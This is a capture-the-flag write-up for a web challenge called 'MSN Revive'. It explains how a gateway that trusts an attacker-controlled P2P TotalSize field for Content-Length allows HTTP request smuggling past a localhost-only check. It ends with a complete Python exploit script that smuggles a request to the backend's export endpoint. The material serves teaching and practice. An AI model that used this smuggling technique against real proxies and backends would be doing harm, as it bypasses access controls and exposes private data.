# MSN Revive

- **Category:** Web
- **Solves:** 174

## Description

I've started building my own personal version of MSN. The site is still under development, but you can already start chatting with your friends...

## Details

The application is built around a two-tier architecture: a Node.js/Express **gateway** that sits in front of a Python/Flask **backend**. All client traffic passes through the gateway, which proxies it to the backend over a persistent HTTP/1.1 keep-alive connection. Access control lives exclusively in the gateway, in particular, the `/api/export/chat` route is gated by a localhost-only check, and the backend itself has no such restriction on its equivalent `/export/chat` endpoint.

```js
app.all("/api/export/chat", (req, res, next) => {
  if (!isLocalhost(req)) {
    return res.status(403).json({ ok: false, error: "WIP: local access only" });
  }
  next();
});
```

The bug lives in how the gateway handles requests with the MSN P2P content type. When a `POST /api/chat/event` arrives with `Content-Type: application/x-msnmsgrp2p`, the gateway extracts the `TotalSize` field from the binary P2P header (an 8-byte little-endian value at offset 16) and uses it to override the forwarded `Content-Length`, setting it to `TotalSize + 48` (the size of the header struct itself):

```js
app.post("/api/chat/event", (req, res) => {
  proxyRequest(req, res, {
    modifyHeaders: (headers, body) => {
      if (!body) return headers;

      const contentType = (headers["content-type"] || "").toLowerCase();
      if (contentType === "application/x-msnmsgrp2p") {
        const msnSize = extractMsnTotalSize(body);
        return {
          ...headers,
          "content-length": msnSize ?? body.length,
        };
      } else {
        return headers;
      }
    },
  });
});
```

Because the attacker fully controls the binary body, they also control `TotalSize`, and therefore the `Content-Length` value that gets forwarded to the backend.
This is the basis for HTTP request smuggling: by setting `TotalSize` to cover only the P2P portion of the body and then appending a complete, self-contained HTTP request at the end of the body, the attacker sends the gateway a single buffer containing two logical HTTP requests.
The gateway forwards the whole buffer to the backend but advertises only the shorter `Content-Length`. Flask/Werkzeug reads exactly that many bytes as the body of `POST /api/chat/event`, and the leftover bytes, the smuggled `POST /api/export/chat` request, are left sitting on the keep-alive socket. Flask then picks them up as the next incoming request on that connection. Since this second request never passes through the gateway's routing layer, the localhost check is never evaluated, and Flask's unprotected export handler executes directly, returning the chat data.

## Solution

```python
import base64
import struct

import requests

TARGET_URL = "<HOST>"
SESSION_ID = "<SESSION_ID>"
USER = "<USER>"

def build_p2p_header(session_id, message_size, total_size=0, flags=0) -> bytes:
    return struct.pack(
        "<IIQQIIIIQ",
        session_id,  # SessionID
        0,  # Identifier
        0,  # Offset
        total_size,  # TotalSize
        message_size,  # MessageSize
        flags,  # Flags
        0,
        0,
        0,  # Ack fields
    )


def get_valid_png() -> bytes:
    return (
        b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
        b"\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
    )

def exploit():
    print("[+] Sending exploit...")

    xml_ctx = '<msnobj Creator="test2" Type="2" />'
    b64_ctx = base64.b64encode(xml_ctx.encode()).decode()

    invite_text = (
        f"INVITE MSNMSGR:justlel@msn.com MSNSLP/1.0\r\n"
        f"To: <msnmsgr:justlel@msn.com>\r\n"
        f"From: <msnmsgr:{USER}@msn.com>\r\n"
        f"Call-ID: {SESSION_ID}\r\n"
        f"CSeq: 0\r\n"
        f"Context: {b64_ctx}\r\n"
        f"\r\n"
    ).encode("utf-8")

    png_data = get_valid_png()

    json_body = '{"session_id": "00000000-0000-0000-0000-000000000000", "format": "xml"}'

    smug_request = (
        "POST /api/export/chat HTTP/1.1\r\n"
        "Host: localhost:5000\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(json_body)}\r\n"
        "\r\n"
        f"{json_body}"
    ).encode("utf-8")

    legitimate_size = len(invite_text) + 48 + len(png_data)

    h1 = build_p2p_header(
        session_id=100,
        message_size=len(invite_text),
        total_size=legitimate_size,
        flags=0x01,
    )

    h2 = build_p2p_header(
        session_id=100,
        message_size=len(png_data),
        total_size=len(png_data),
        flags=0x02,
    )

    full_body = h1 + invite_text + h2 + png_data + smug_request

    try:
        s = requests.Session()

        s.post(
            f"{TARGET_URL}/api/auth/login",
            json={"username": USER, "password": USER},
        )
        s.post(
            f"{TARGET_URL}/api/chat/event",
            data=full_body,
            headers={
                "Content-Type": "application/x-msnmsgrp2p",
            },
        )
        r = s.get(f"{TARGET_URL}/api/me")

        print(f"[2] Status: {r.status_code}")
        print(f"[2] Response: {r.text}")

    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    exploit()
```
